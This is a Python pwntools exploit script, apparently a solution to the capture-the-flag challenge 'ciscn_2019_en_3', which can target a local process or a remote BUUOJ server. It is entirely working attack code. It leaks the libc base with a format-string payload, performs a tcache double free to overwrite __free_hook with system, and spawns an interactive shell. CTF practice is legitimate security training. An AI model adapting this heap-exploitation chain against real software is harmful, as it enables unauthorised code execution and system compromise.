import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_en_3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_en_3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28982)
			elf=ELF('./ciscn_2019_en_3')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a,b):
			io.sendlineafter('Input your choice:','1')
			io.sendlineafter(': \n',str(a))
			io.sendafter(': \n',b)

		def delete(a):
			io.sendlineafter('Input your choice:','4')
			io.sendlineafter(':\n',str(a))


		pay='%a%a%a%a'
		io.sendlineafter("What's your name?\n",pay)
		libc_base=int(io.recv(0x61).split('0x0.0')[4][:11]+'0',16)-libc.sym['_IO_file_jumps']
		libc.address=libc_base
		pay='111'
		io.sendlineafter('ID.\n',pay)
		add(0x30,'aaaa')
		add(0x30,'/bin/sh\x00')
		delete(0)
		delete(0)
		add(0x30,p64(libc.sym['__free_hook']))
		add(0x30,'aaa')
		add(0x30,p64(libc.sym['system']))

		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue